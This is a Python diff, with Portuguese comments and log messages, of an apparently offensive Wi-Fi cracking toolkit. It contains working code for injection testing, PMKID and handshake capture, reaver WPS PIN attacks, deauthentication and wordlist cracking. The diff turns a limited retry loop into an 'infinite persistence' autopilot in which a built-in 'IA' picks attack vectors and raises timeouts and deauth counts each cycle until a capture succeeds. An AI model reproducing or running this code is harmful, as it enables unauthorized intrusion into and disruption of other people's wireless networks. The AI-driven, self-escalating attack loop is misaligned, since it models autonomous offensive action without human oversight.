@@ -7,7 +7,7 @@ import threading
 from datetime import datetime
 
 # ==============================================================
-# UI MODERNA - HACKER SUPREMO (ULTIMATE STABLE EDITION)
+# UI MODERNA - GRÃO-MESTRE SUPREMO (PERSISTÊNCIA INFINITA)
 # ==============================================================
 try:
     from rich.console import Console
@@ -23,6 +23,7 @@ except ImportError:
 
 console = Console()
 WEB_CALLBACK = None
+AUTOPILOT_ACTIVE = False # Flag global de controle
 
 def supreme_log(msg, log_type="info"):
     if WEB_CALLBACK: WEB_CALLBACK(msg, log_type)
@@ -47,37 +48,24 @@ def analyze_vulnerabilities(vendor, essid, privacy):
     vulns, advice = [], ""
     injection_works = os.path.exists("/tmp/dsi_injection_ok")
     if "Starlink" in vendor or "Starlink" in essid:
-        advice = "ALVO NÍVEL 10 (STARLINK). PMF Ativo. Use VETOR X ou AUTOPILOTO."
+        advice = "ALVO NÍVEL 10 (STARLINK). PMF Ativo. Modo de Combate Persistente necessário."
         vulns.append("PMF (802.11w)")
     elif not injection_works:
-        advice = "GARGALO DE HARDWARE: Injeção falhou. Autopiloto priorizando vetores passivos."
-    else: advice = "Alvo analisado. Arsenal total liberado."
+        advice = "GARGALO DE HARDWARE: Injeção falhou. Foco total em PMKID e WPS."
+    else: advice = "Alvo mapeado. Arsenal total liberado."
     return vulns, advice
 
 def test_injection(interface):
     run_command("rm -f /tmp/dsi_injection_ok")
     supreme_log(f"Iniciando Calibração de Injeção em {interface}...", log_type="cmd")
-    
-    # LOCKDOWN DE CANAL PARA ESTABILIZAÇÃO
-    run_command(f"iw dev {interface} set channel 1", sudo=True)
-    time.sleep(1)
-    
-    stdout, _ = run_command(f"aireplay-ng -9 {interface}")
-    if stdout and "Injection is working!" in stdout:
-        supreme_log("HARDWARE VALIDADO: Injeção operacional.", log_type="info")
-        with open("/tmp/dsi_injection_ok", "w") as f: f.write("ok")
-        return True
-    
-    # Segunda tentativa em outro canal
     run_command(f"iw dev {interface} set channel 6", sudo=True)
     time.sleep(1)
-    stdout2, _ = run_command(f"aireplay-ng -9 {interface}")
-    if stdout2 and "Injection is working!" in stdout2:
-        supreme_log("HARDWARE VALIDADO (CH 6): Injeção operacional.", log_type="info")
+    stdout, _ = run_command(f"aireplay-ng -9 {interface}")
+    if stdout and "Injection is working!" in stdout:
+        supreme_log("HARDWARE VALIDADO PARA COMBATE ATIVO.", log_type="info")
         with open("/tmp/dsi_injection_ok", "w") as f: f.write("ok")
         return True
-
-    supreme_log("HARDWARE LIMITADO: Injeção não detectada pelo Kernel.", log_type="error")
+    supreme_log("HARDWARE LIMITADO: Injeção falhou. Modo Persistente ativado para compensação.", log_type="error")
     return False
 
 def boost_signal(interface):
@@ -110,7 +98,7 @@ def run_command(command, sudo=False, capture_output=True, text=True):
     except: return None, ""
 
 def check_aircrack_ng():
-    ferramentas = ["aircrack-ng", "hcxdumptool", "hcxtools", "mdk4", "macchanger", "reaver", "wifite", "dnsmasq", "hostapd"]
+    ferramentas = ["aircrack-ng", "hcxdumptool", "hcxtools", "mdk4", "macchanger", "reaver", "wifite"]
     for f in ferramentas:
         stdout, _ = run_command(f"dpkg -s {f}")
         if not (stdout and "install ok installed" in stdout):
@@ -120,14 +108,12 @@ def check_aircrack_ng():
 def update_zero_day():
     supreme_log("PROTOCOLO ZERO-DAY ATIVO.", log_type="cmd")
     run_command("apt update -y", sudo=True)
-    run_command("apt install -y libcurl4-openssl-dev libssl-dev zlib1g-dev libpcap-dev", sudo=True)
     run_command("git pull origin main")
     supreme_log("ARSENAL ATUALIZADO.")
 
 def set_monitor_mode(interface):
     supreme_log(f"Invocando Modo Monitor em {interface}...", log_type="cmd")
     run_command("rfkill unblock all", sudo=True)
-    # Mascaramento para evitar que o NetworkManager tome a interface de volta
     run_command("systemctl stop NetworkManager wpa_supplicant", sudo=True)
     run_command("airmon-ng check kill", sudo=True)
     run_command(f"ip link set {interface} down", sudo=True)
@@ -175,10 +161,10 @@ def capture_pmkid(monitor_interface, bssid, channel, output_file, params=None):
     pcapng = f"{output_file}_pmkid.pcapng"; hashf = f"{output_file}_pmkid.16800"
     run_command(f"rm -f {pcapng} {hashf}", sudo=True)
     run_command(f"iw dev {monitor_interface} set channel {channel}", sudo=True)
-    intensity = params.get('intensity', 15) if params else 15
-    timeout = params.get('timeout', 60) if params else 60
     filtro = "alvo_filtro.txt"
     with open(filtro, "w") as f: f.write(bssid.replace(":", "") + "\n")
+    intensity = params.get('intensity', 15) if params else 15
+    timeout = params.get('timeout', 60) if params else 60
     cmd = f"sudo hcxdumptool -i {monitor_interface} -o {pcapng} --filterlist_ap={filtro} --filtermode=2 --enable_status={intensity}"
     try:
         proc = subprocess.Popen(cmd, shell=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
@@ -210,7 +196,7 @@ def capture_handshake(monitor_interface, bssid, channel, output_file, params=Non
     dump_proc.terminate(); return cap_file if handshake_found else None
 
 def capture_wps(monitor_interface, bssid, channel, params=None):
-    timeout = params.get('timeout', 180) if params else 180
+    timeout = params.get('timeout', 120) if params else 120
     cmd = f"sudo reaver -i {monitor_interface} -b {bssid} -c {channel} -K 1 -vv -f"
     try:
         res = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
@@ -234,30 +220,51 @@ def start_evil_twin(interface, essid):
     supreme_log("Evil Twin em desenvolvimento.")
 
 def run_autopilot(interface, target):
+    global AUTOPILOT_ACTIVE
     from dsi_ai import DSIAI
     brain = DSIAI()
+    AUTOPILOT_ACTIVE = True
     prefix = f"capture_{target['essid']}"
     hw_ok = os.path.exists("/tmp/dsi_injection_ok")
-    for attempt in range(5):
+    
+    cycle = 1
+    supreme_log(f"INICIANDO MODO INFALÍVEL: Incursão contínua em {target['essid']}", log_type="cmd")
+    
+    while AUTOPILOT_ACTIVE:
+        supreme_log(f"🧠 IA calculando estratégia - Ciclo {cycle}...")
         attack_type, params = brain.suggest_next_attack(target['bssid'], hw_injection_ok=hw_ok)
-        supreme_log(f"Autopiloto Ciclo {attempt+1}: {attack_type}")
+        
+        # A IA aumenta a agressividade em cada loop infinito
+        if cycle > 1:
+            params['timeout'] = params.get('timeout', 60) + (cycle * 20)
+            if 'deauth_count' in params: params['deauth_count'] += 10
+
+        supreme_log(f"🤖 IA Decidiu: Vetor [{attack_type.upper()}] (Timeout: {params.get('timeout')}s)")
+        
         cap = None
         if attack_type == 'pmkid': cap = capture_pmkid(interface, target['bssid'], target['channel'], prefix, params)
         elif attack_type == 'handshake': cap = capture_handshake(interface, target['bssid'], target['channel'], prefix, params)
         elif attack_type == 'vetorx': cap = capture_vetor_x(interface, target['bssid'], target['channel'], prefix, params)
         elif attack_type == 'wps':
             if capture_wps(interface, target['bssid'], target['channel'], params):
-                brain.learn(target['bssid'], target['essid'], attack_type, True, params, "Sucesso")
+                brain.learn(target['bssid'], target['essid'], attack_type, True, params, "PIN")
+                AUTOPILOT_ACTIVE = False
                 return "WPS_SUCCESS"
         elif attack_type == 'ghost':
             start_ghost_attack(interface, target['essid'], params)
             brain.learn(target['bssid'], target['essid'], attack_type, False, params, "Fantasma")
-            continue
+        
         if cap:
-            brain.learn(target['bssid'], target['essid'], attack_type, True, params, "Sucesso")
+            brain.learn(target['bssid'], target['essid'], attack_type, True, params, "Capture")
+            AUTOPILOT_ACTIVE = False
             return cap
         else:
-            brain.learn(target['bssid'], target['essid'], attack_type, False, params, "Falha")
+            brain.learn(target['bssid'], target['essid'], attack_type, False, params, "Resistido")
+            supreme_log(f"📉 Ciclo {cycle} resistido. Reajustando arsenal para Ciclo {cycle+1}...")
+        
+        cycle += 1
+        time.sleep(2) # Respiro entre ataques
+        
     return None
 
 def scan_networks(monitor_interface):
@@ -305,7 +312,6 @@ def crack_hash(hash_file, wordlist_file, bssid=None):
                 if "KEY FOUND" in l or ":" in l: supreme_log(f"RESULTADO: {l}")
             return True
         if "rockyou" in wordlist_file:
-            supreme_log("Dicionário básico falhou. Baixando avançado...")
             av_wl = "/tmp/wpa_adv.txt"
             run_command(f"wget -qO {av_wl} https://raw.githubusercontent.com/kennbroorg/iDict/master/iDict_wpa.txt")
             if os.path.exists(av_wl):
